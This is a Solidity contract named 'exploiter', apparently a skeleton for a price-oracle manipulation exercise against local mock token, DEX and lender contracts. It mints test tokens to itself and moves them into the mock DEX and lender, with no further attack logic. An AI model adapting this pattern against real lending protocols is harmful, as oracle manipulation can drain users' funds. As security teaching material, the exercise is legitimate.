pragma solidity ^0.8.0;

import "./openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./eth.sol";
import "./usd.sol";
import "./dex.sol";
import "./lender.sol";

contract exploiter{
Dex priceoracle;
etherToken eth;
usdToken usd;
Loaner lender1;

constructor(address payable ethtoken,address payable usdtoken,address payable oracle, address payable lender) public { 
    priceoracle= Dex(oracle);
    eth=etherToken(ethtoken);
    usd=usdToken(usdtoken);
    lender1=Loaner(lender);
    usd.mint(address(this),5000);
    eth.mint(address(this),5000);
}

function buyeth(uint256 amount) public {
    usd.transferFrom(address(this),address(priceoracle),amount);
}

function selleth(uint256 amount) public {
    eth.transferFrom(address(this),address(priceoracle),amount);
}

function borroweth(uint256 amount) public {
        usd.transferFrom(address(this),address(lender1),amount);
    }

function borrowusd(uint256 amount) public {
        eth.transferFrom(address(this),address(lender1),amount);
    }

receive() external payable {}
}